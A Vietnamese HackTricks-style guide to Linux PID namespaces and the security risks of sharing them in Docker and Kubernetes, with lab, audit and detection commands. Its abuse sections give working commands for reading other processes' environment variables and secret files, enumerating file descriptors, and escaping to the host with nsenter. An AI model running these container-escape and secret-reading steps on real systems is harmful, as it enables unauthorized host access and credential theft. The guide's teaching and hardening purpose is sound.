# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Tổng quan

PID namespace kiểm soát cách đánh số tiến trình và những tiến trình nào có thể được nhìn thấy. Vì vậy, một container có thể có PID 1 riêng dù nó không phải là một máy thật. Bên trong namespace, workload thấy một cây tiến trình có vẻ như cục bộ. Bên ngoài namespace, host vẫn thấy các PID thực trên host và toàn bộ tiến trình.<sup>[[3]](#references)</sup>

Xét về bảo mật, PID namespace quan trọng vì khả năng quan sát tiến trình rất có giá trị. Khi workload có thể thấy các tiến trình trên host, nó có thể quan sát tên dịch vụ, đối số dòng lệnh, bí mật được truyền qua đối số tiến trình, trạng thái suy ra từ môi trường thông qua `/proc` và các mục tiêu có khả năng cho phép vào namespace. Nếu nó có thể làm nhiều hơn việc chỉ nhìn thấy các tiến trình đó, chẳng hạn gửi tín hiệu hoặc dùng ptrace trong điều kiện phù hợp, vấn đề sẽ nghiêm trọng hơn nhiều.

## Cách hoạt động

PID namespace mới bắt đầu với hệ thống đánh số tiến trình nội bộ riêng. Tiến trình đầu tiên được tạo bên trong namespace sẽ trở thành PID 1 theo góc nhìn của namespace đó; điều này cũng đồng nghĩa tiến trình có ngữ nghĩa đặc biệt giống init đối với các tiến trình con mồ côi và cách xử lý tín hiệu. Điều này giải thích nhiều hành vi khác thường của container liên quan đến tiến trình init, việc thu gom tiến trình zombie và lý do đôi khi container sử dụng các trình bao bọc init nhỏ gọn.<sup>[[3]](#references)</sup>

PID namespace tạo thành một hệ thống phân cấp. Tiến trình trong namespace tổ tiên có thể truy cập các namespace hậu duệ bằng PID được gán trong namespace tổ tiên đó, nhưng tiến trình hậu duệ không thể truy cập các tác vụ chỉ thuộc namespace tổ tiên thông qua các syscall dựa trên PID thông thường hoặc dùng `setns()` để đi lên namespace PID tổ tiên. Tuy nhiên, procfs thuộc namespace tổ tiên nếu được chủ ý hiển thị cho namespace hậu duệ vẫn có thể làm lộ góc nhìn tiến trình của namespace tổ tiên. Ngoài ra, tham gia một PID namespace bằng `setns()` chỉ thay đổi namespace áp dụng cho **các tiến trình con được tạo sau đó**, chứ không phải tiến trình gọi; vì vậy, các công cụ sẽ fork sau khi tham gia. Một mount procfs giữ nguyên góc nhìn PID của tiến trình đã mount nó. Do đó, tạo procfs mới sau `unshare(CLONE_NEWPID)` có ý nghĩa về bảo mật, chứ không chỉ là vấn đề hình thức.<sup>[[3]](#references)</sup>

Bài học bảo mật quan trọng là một tiến trình có thể trông như được cô lập vì chỉ thấy cây PID của chính nó, nhưng sự cô lập đó có thể bị loại bỏ có chủ ý. Docker cung cấp khả năng này qua `--pid=host`, còn Kubernetes thực hiện điều tương tự qua `hostPID: true`. Khi container tham gia PID namespace của host, workload sẽ thấy trực tiếp các tiến trình trên host, khiến nhiều đường tấn công tiếp theo trở nên thực tế hơn nhiều.

## Lab

Để tạo PID namespace theo cách thủ công:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Shell giờ thấy một chế độ xem tiến trình riêng tư. Cờ `--mount-proc` rất quan trọng vì nó gắn một phiên bản procfs khớp với PID namespace mới, giúp danh sách tiến trình nhất quán khi xem từ bên trong.<sup>[[3]](#references)</sup>

Để so sánh hành vi của container:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

Sự khác biệt này rõ ràng ngay lập tức và dễ hiểu, vì vậy đây là bài thực hành đầu tiên phù hợp cho người đọc.

## Cách sử dụng khi chạy

Các container thông thường trong Docker, Podman, containerd và CRI-O có PID namespace riêng. Container Kubernetes thường có chế độ xem PID riêng; `shareProcessNamespace: true` cố ý tạo một chế độ xem chung cho toàn Pod.<sup>[[4]](#references)</sup> Ngược lại, `hostPID: true` chọn PID namespace của node. Môi trường LXC/Incus dựa trên cùng một cơ chế kernel, dù các trường hợp sử dụng system container có thể làm lộ ra cây tiến trình phức tạp hơn và khiến người dùng dễ chọn các lối tắt khi debug.

Quy tắc này áp dụng ở mọi nơi: nếu runtime chọn không cô lập PID namespace, đó là sự giảm thiểu có chủ ý đối với ranh giới container.

## Cấu hình sai

Cấu hình sai điển hình là chia sẻ PID của host. Các nhóm thường biện minh cho việc này bằng sự tiện lợi khi debug, giám sát hoặc quản lý dịch vụ, nhưng đây luôn phải được xem là một ngoại lệ bảo mật đáng kể. Ngay cả khi container không có khả năng ghi trực tiếp lên tiến trình của host, chỉ riêng việc có thể quan sát cũng có thể tiết lộ nhiều thông tin về hệ thống. Khi bổ sung các capability như `CAP_SYS_PTRACE` hoặc quyền truy cập procfs hữu ích, rủi ro tăng lên đáng kể.

Một sai lầm khác là cho rằng việc chia sẻ PID của host vô hại chỉ vì workload mặc định không thể kill hoặc ptrace tiến trình của host. Kết luận đó bỏ qua giá trị của việc liệt kê, khả năng có các mục tiêu để gia nhập namespace và cách khả năng nhìn thấy PID kết hợp với những biện pháp kiểm soát khác bị nới lỏng.

### Chia sẻ tiến trình trong toàn Pod của Kubernetes

`shareProcessNamespace: true` khác với `hostPID`: tùy chọn này cho phép thấy tiến trình của **các container khác trong cùng Pod**, chứ không phải tiến trình của node. Khi đó, sidecar hoặc debug container bị xâm nhập có thể liệt kê dòng lệnh và dữ liệu môi trường của container cùng Pod, tùy thuộc vào các kiểm tra quyền truy cập procfs; gửi signal khi credential cho phép; và duyệt filesystem của container cùng Pod thông qua `/proc/<pid>/root`. Kubernetes cảnh báo rõ rằng khi đó, bí mật trong dòng lệnh/biến môi trường và filesystem của container chỉ được bảo vệ bằng các quyền Unix hiện hành.<sup>[[4]](#references)</sup>

Nội dung hữu ích cần rà soát ở phía cluster:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Từ một container bị xâm nhập trong PID namespace áp dụng toàn Pod, trước tiên hãy kiểm tra quyền truy cập thực tế thay vì cho rằng nhìn thấy đồng nghĩa với đọc được:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Nhắm mục tiêu container tạm thời trong một Kubernetes Pod hiện có

Một danh tính Kubernetes được phép sửa đổi `pods/ephemeralcontainers` có thể thêm debugger vào Pod đang chạy ngay cả khi `shareProcessNamespace` chưa được bật. Với `--target`, debugger tham gia process namespace của container được chỉ định nếu runtime hỗ trợ nhắm mục tiêu namespace. Điều này cho phép xem các tiến trình của container đó, chứ không phải PID namespace của node.<sup>[[5]](#references)</sup>

API sử dụng một subresource riêng, vì vậy hãy kiểm tra quyền `patch`/`update` thay vì cho rằng quyền ghi Pod thông thường bao gồm quyền này.<sup>[[6]](#references)</sup>

Với một Pod và container trong namespace được phép, hãy kiểm tra chế độ xem được nhắm mục tiêu:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Nếu runtime không hỗ trợ targeting, debugger có thể không khởi động được hoặc vẫn nằm trong một PID namespace bị cô lập.<sup>[[5]](#references)</sup> Nếu targeting hoạt động, hãy dùng các bước kiểm tra trong mục [Chia sẻ tiến trình trên toàn Pod trong Kubernetes](#kubernetes-pod-wide-process-sharing) để kiểm tra quyền truy cập `/proc/<pid>`. Nhìn thấy tiến trình không đồng nghĩa với việc được phép đọc secrets của tiến trình đó hoặc gửi tín hiệu đến nó: thông tin xác thực Unix và các bước kiểm tra quyền truy cập procfs vẫn được áp dụng.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards cũng giới hạn các thiết lập privileged trên ephemeral containers.<sup>[[7]](#references)</sup>

## Lạm dụng

Nếu host PID namespace được chia sẻ, kẻ tấn công có thể kiểm tra các tiến trình trên host, thu thập các đối số của tiến trình, xác định các dịch vụ đáng chú ý, tìm các PID tiềm năng để dùng với `nsenter`, hoặc kết hợp khả năng nhìn thấy tiến trình với đặc quyền liên quan đến ptrace để can thiệp vào workload trên host hoặc workload lân cận. Trong một số trường hợp, chỉ cần nhìn thấy đúng tiến trình chạy lâu dài là đã đủ để thay đổi phần còn lại của kế hoạch tấn công.

Bước thực tế đầu tiên luôn là xác nhận rằng các tiến trình trên host thực sự hiển thị:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Khi có thể nhìn thấy PID trên host, các đối số của tiến trình và mục tiêu để tham gia namespace thường là nguồn thông tin hữu ích nhất:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Nếu có `nsenter` và đủ quyền, hãy kiểm tra xem có thể dùng một tiến trình host hiển thị làm cầu nối namespace hay không:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Ngay cả khi việc xâm nhập bị chặn, chia sẻ PID của host vẫn có giá trị vì nó tiết lộ cấu trúc dịch vụ, các thành phần runtime và những tiến trình có đặc quyền tiềm năng để nhắm mục tiêu tiếp theo. Chỉ riêng khả năng nhìn thấy PID **không** cấp quyền gửi tín hiệu, theo dõi, đọc các mục nhạy cảm trong `/proc/<pid>` hoặc tham gia các namespace khác của mục tiêu; thông tin xác thực, trạng thái dumpability, capabilities trong user namespace sở hữu namespace của mục tiêu, chính sách Yama/LSM và seccomp vẫn có vai trò quan trọng.<sup>[[3]](#references)</sup> Xem [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) để biết các ví dụ về process injection.

Khả năng nhìn thấy PID của host cũng khiến việc lạm dụng file descriptor thực tế hơn. Nếu một tiến trình host có đặc quyền hoặc workload lân cận đang mở một file hay socket nhạy cảm, kẻ tấn công có thể kiểm tra `/proc/<pid>/fd/` và truy cập đối tượng nền, tùy thuộc vào các kiểm tra kiểu ptrace, quyền sở hữu, tùy chọn mount procfs, loại đối tượng và mô hình dịch vụ mục tiêu. Chỉ nhìn thấy symlink FD không có nghĩa là có thể mở nó, và không thể nhân bản socket chỉ bằng cách mở symlink `/proc/<pid>/fd/N` của nó. Để biết về primitive riêng biệt `pidfd_getfd()` và các kiểm tra cấp quyền của nó, xem [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Các lệnh này hữu ích vì chúng cho biết liệu `hidepid=1` hoặc `hidepid=2` có hạn chế khả năng quan sát giữa các process hay không, và liệu các file descriptor rõ ràng đáng chú ý như file bí mật đang mở, log hoặc Unix socket có hiển thị hay không.

### Ví dụ đầy đủ: PID của host + `nsenter`

Chia sẻ PID của host có thể cho phép host escape khi process có các capability cần thiết để tham gia các namespace của host và sử dụng root của process trên host. Cần `nsenter --root` (`-r`) cho việc sau: chỉ thay đổi mount namespace không làm thay đổi thư mục root của caller.<sup>[[9]](#references)</sup> Việc truy cập `/proc/1/root` chịu sự kiểm tra quyền đọc ptrace, trong khi việc thay đổi root yêu cầu `CAP_SYS_CHROOT` trong user namespace của caller.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Nếu lệnh chạy thành công, shell mới sử dụng các mount, UTS, network, IPC và PID namespace của host cùng với root filesystem của PID 1. Hãy kiểm tra danh tính và quyền truy cập hiệu lực thay vì cho rằng chỉ riêng khả năng nhìn thấy PID đã cấp quyền trên host.<sup>[[9]](#references)</sup>

Ngay cả khi thiếu `nsenter`, vẫn có thể đạt được kết quả tương tự thông qua binary trên host nếu filesystem của host được mount:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Ghi chú gần đây về runtime

Một số cuộc tấn công liên quan đến PID namespace không xuất phát từ cấu hình sai truyền thống `hostPID: true`, mà từ lỗi trong quá trình triển khai runtime về cách áp dụng các biện pháp bảo vệ procfs khi thiết lập container.

#### Cuộc đua `maskedPaths` tới procfs của host

Trong các phiên bản `runc` dễ bị tấn công, kẻ tấn công có thể kiểm soát image của container hoặc workload `runc exec` và chạy đua với giai đoạn masking bằng cách thay `/dev/null` phía container bằng một symlink trỏ đến đường dẫn procfs nhạy cảm, chẳng hạn như `/proc/sys/kernel/core_pattern`. Nếu cuộc đua thành công, bind mount của masked path có thể được gắn vào sai đích và làm lộ các thiết lập procfs toàn cục của host cho container mới.<sup>[[1]](#references)</sup>

Lệnh hữu ích để rà soát:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Điều này quan trọng vì tác động cuối cùng có thể giống với việc để lộ procfs trực tiếp: `core_pattern` hoặc `sysrq-trigger` có quyền ghi, dẫn đến thực thi mã trên host hoặc từ chối dịch vụ. Các trang [đường dẫn bị che](../masked-paths.md) và [mount nhạy cảm trên host](../../sensitive-host-mounts.md) trình bày bề mặt tấn công procfs nói chung mà không lặp lại nội dung ở đây.

#### Chèn namespace bằng `insject`

Các công cụ chèn namespace như `insject` cho thấy việc tương tác với PID namespace không phải lúc nào cũng đòi hỏi phải vào namespace mục tiêu trước khi tạo tiến trình. Một tiến trình trợ giúp có thể gắn vào sau, dùng `setns()` rồi thực thi, đồng thời vẫn giữ khả năng quan sát không gian PID mục tiêu:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Loại kỹ thuật này chủ yếu hữu ích trong các quy trình debug nâng cao, công cụ tấn công và hậu khai thác, khi cần ghép ngữ cảnh namespace sau khi workload đã được khởi tạo.

### Các kiểu lạm dụng FD liên quan

Có hai kiểu cần nêu rõ khi nhìn thấy PID của host. Thứ nhất, một tiến trình có đặc quyền có thể giữ một file descriptor nhạy cảm mở qua `execve()` vì nó không được đánh dấu `O_CLOEXEC`. Thứ hai, các dịch vụ có thể truyền file descriptor qua Unix socket bằng `SCM_RIGHTS`. Trong cả hai trường hợp, đối tượng đáng chú ý không còn là pathname, mà là handle đã mở mà tiến trình có quyền thấp hơn có thể kế thừa hoặc nhận được.

Điều này quan trọng khi làm việc với container vì handle có thể trỏ đến `docker.sock`, một log có đặc quyền, một tệp bí mật trên host hoặc một đối tượng giá trị cao khác, ngay cả khi container không thể truy cập trực tiếp đường dẫn đó trong filesystem.

## Kiểm tra

Mục đích của các lệnh này là xác định xem tiến trình có chế độ xem PID riêng hay nó đã có thể liệt kê một phạm vi tiến trình rộng hơn nhiều.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Điều gì đáng chú ý ở đây:<sup>[[3]](#references)</sup>

- Nếu danh sách tiến trình có các dịch vụ host rõ ràng, có thể host PID sharing đã được bật.
- Chỉ thấy một cây tiến trình nhỏ trong container là trạng thái bình thường; thấy `systemd`, `dockerd` hoặc các daemon không liên quan thì không.
- `NSpid` có thể hiển thị ánh xạ PID qua các namespace lồng nhau. Giá trị ngoài cùng bên trái ứng với PID namespace liên kết với điểm gắn procfs, tiếp theo là các giá trị của những namespace lồng nhau lần lượt.
- Chỉ riêng `readlink /proc/self/ns/pid` không thể chứng minh `hostPID`: container bị cô lập cũng có inode PID namespace hợp lệ. Hãy đối chiếu với danh sách tiến trình, điểm gắn procfs, cấu hình runtime và inode namespace phía host nếu có.
- Khi PID của host đã hiển thị, ngay cả thông tin tiến trình chỉ đọc cũng hữu ích cho việc trinh sát.

Nếu phát hiện container đang chạy với host PID sharing, đừng xem đó là một khác biệt chỉ mang tính hình thức. Điều này làm thay đổi đáng kể những gì workload có thể quan sát và có khả năng tác động đến.

## References

- [1] [Khuyến cáo bảo mật runc: thoát container bằng cách lạm dụng "masked path" do điều kiện tranh chấp khi mount (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Phát hành công cụ – insject: Công cụ đưa vào Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Sách Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Chia sẻ Process Namespace giữa các Container trong một Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Gỡ lỗi các Pod đang chạy](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP về Ephemeral Containers](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Tiêu chuẩn bảo mật Pod](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
